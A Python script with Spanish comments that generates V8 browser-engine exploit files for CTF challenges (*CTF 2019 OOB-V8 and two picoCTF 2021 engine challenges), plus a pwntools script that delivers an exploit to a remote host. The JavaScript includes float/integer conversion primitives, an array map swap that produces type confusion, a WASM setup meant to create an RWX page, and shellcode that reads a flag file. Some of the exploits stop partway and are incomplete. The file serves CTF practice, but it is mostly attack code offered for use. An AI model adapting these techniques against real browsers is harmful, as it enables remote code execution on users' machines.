#!/usr/bin/env python3
"""
Ejemplos específicos de V8 exploitation basados en las notas de ir0nstone
"""

from v8_exploit_tool import V8ExploitTool

def example_ctf_2019_oob():
    """Ejemplo basado en *CTF 2019 OOB-V8 challenge"""
    print("\n=== EJEMPLO: *CTF 2019 OOB-V8 ===")
    
    # JavaScript exploit específico para el challenge
    js_exploit = '''
// *CTF 2019 OOB-V8 Exploit
// Basado en las notas de ir0nstone

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Arrays para el exploit
var float_arr = [1.1, 2.2, 3.3, 4.4];
var obj_arr = [{}, {}, {}, {}];

console.log("[*] Iniciando exploit OOB...");

// Usar la función .oob() vulnerable
if (typeof float_arr.oob === 'function') {
    console.log("[+] Función .oob() encontrada");
    
    // Leak OOB
    var leaked_map = float_arr.oob();
    console.log("[+] Map leaked: " + leaked_map);
    
    // Obtener map de obj_arr
    var obj_map = obj_arr.oob();
    console.log("[+] Object map: " + obj_map);
    
    // Intercambiar maps para confundir el tipo
    float_arr.oob(obj_map);
    obj_arr.oob(leaked_map);
    
    console.log("[+] Maps intercambiados - type confusion logrado");
    
    // Ahora float_arr piensa que es un array de objetos
    // y obj_arr piensa que es un array de floats
    
} else {
    console.log("[-] Función .oob() no disponible");
}
'''
    
    # Guardar exploit
    with open("ctf_2019_oob.js", "w") as f:
        f.write(js_exploit)
    
    print("[+] Exploit guardado en ctf_2019_oob.js")
    print("[*] Para ejecutar: ./d8 --allow-natives-syntax ctf_2019_oob.js")

def example_picoctf_kit_engine():
    """Ejemplo basado en picoCTF 2021 Kit Engine"""
    print("\n=== EJEMPLO: picoCTF 2021 Kit Engine ===")
    
    js_exploit = '''
// picoCTF 2021 Kit Engine Exploit
// Browser exploitation con WASM

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// WASM para crear página RWX
var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
    4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
    138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WASM instance creada");

// Shellcode para cat flag.txt (desde el writeup)
var shellcode = [
    0x0cfe016a, 0x2fb84824, 0x2f6e6962, 0x50746163, 0x68e78948, 0x7478742e,
    0x0101b848, 0x01010101, 0x48500101, 0x756062b8, 0x606d6701, 0x04314866,
    0x56f63124, 0x485e0c6a, 0x6a56e601, 0x01485e10, 0x894856e6, 0x6ad231e6,
    0x050f583b
];

console.log("[+] Shellcode preparado");
console.log("[*] Ejecutando WASM function...");

// Ejecutar función WASM (esto crearía la página RWX)
try {
    f();
    console.log("[+] WASM ejecutado exitosamente");
} catch(e) {
    console.log("[-] Error ejecutando WASM: " + e);
}
'''
    
    with open("picoctf_kit_engine.js", "w") as f:
        f.write(js_exploit)
    
    print("[+] Exploit guardado en picoctf_kit_engine.js")

def example_download_horsepower():
    """Ejemplo basado en picoCTF 2021 Download Horsepower"""
    print("\n=== EJEMPLO: picoCTF 2021 Download Horsepower ===")
    
    js_exploit = '''
// picoCTF 2021 Download Horsepower
// Exploit con pointer compression

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Test de la función setHorsepower (si existe)
var test_arr = [1.1, 2.2, 3.3];

console.log("[*] Array inicial:", test_arr);
console.log("[*] Longitud inicial:", test_arr.length);

if (typeof test_arr.setHorsepower === 'function') {
    console.log("[+] Función setHorsepower encontrada");
    
    try {
        // Intentar cambiar la longitud del array
        test_arr.setHorsepower(10);
        console.log("[+] Longitud después de setHorsepower:", test_arr.length);
        
        // Esto podría causar OOB si la función es vulnerable
        for (let i = 0; i < 15; i++) {
            try {
                console.log("Index " + i + ":", test_arr[i]);
            } catch(e) {
                console.log("Error en index " + i + ":", e);
            }
        }
        
    } catch(e) {
        console.log("[-] Error usando setHorsepower:", e);
    }
} else {
    console.log("[-] Función setHorsepower no disponible");
}

// Pointer compression handling
console.log("[*] Trabajando con pointer compression...");

// En V8 con pointer compression, los punteros son de 32 bits
// pero se almacenan en un espacio de 64 bits
function compress_pointer(addr) {
    return addr & 0xffffffffn;
}

function decompress_pointer(compressed, base) {
    return base + compressed;
}

console.log("[+] Funciones de pointer compression listas");
'''
    
    with open("picoctf_download_horsepower.js", "w") as f:
        f.write(js_exploit)
    
    print("[+] Exploit guardado en picoctf_download_horsepower.js")

def create_delivery_script_example():
    """Crear script de ejemplo para entregar exploits remotamente"""
    print("\n=== EJEMPLO: Script de Entrega Remota ===")
    
    delivery_script = '''#!/usr/bin/env python3
"""
Script de entrega para exploits V8 remotos
Basado en los ejemplos de picoCTF
"""

from pwn import *
import sys

def deliver_exploit(host, port, exploit_file):
    """Entregar exploit a servidor remoto"""
    
    # Leer archivo de exploit
    try:
        with open(exploit_file, "rb") as f:
            exploit = f.read()
    except FileNotFoundError:
        print(f"[-] Archivo {exploit_file} no encontrado")
        return False
    
    print(f"[*] Conectando a {host}:{port}")
    print(f"[*] Enviando exploit de {len(exploit)} bytes")
    
    try:
        # Conectar al servidor
        p = remote(host, port)
        
        # Enviar tamaño del exploit
        p.sendlineafter(b'5k:', str(len(exploit)).encode())
        
        # Enviar exploit
        p.sendlineafter(b'please!!\\n', exploit)
        
        # Recibir resultado
        print("[*] Esperando resultado...")
        result = p.recvall(timeout=10)
        
        print("[+] Resultado recibido:")
        print(result.decode())
        
        p.close()
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python deliver.py <host> <port> <exploit.js>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    exploit_file = sys.argv[3]
    
    deliver_exploit(host, port, exploit_file)
'''
    
    with open("deliver_v8_exploit.py", "w") as f:
        f.write(delivery_script)
    
    print("[+] Script de entrega guardado en deliver_v8_exploit.py")
    print("[*] Uso: python deliver_v8_exploit.py <host> <port> <exploit.js>")

def main():
    """Ejecutar todos los ejemplos"""
    print("Generando ejemplos de V8 exploitation...")
    
    example_ctf_2019_oob()
    example_picoctf_kit_engine()
    example_download_horsepower()
    create_delivery_script_example()
    
    print("\n[+] Todos los ejemplos generados exitosamente!")
    print("\nArchivos creados:")
    print("- ctf_2019_oob.js")
    print("- picoctf_kit_engine.js") 
    print("- picoctf_download_horsepower.js")
    print("- deliver_v8_exploit.py")

if __name__ == "__main__":
    main()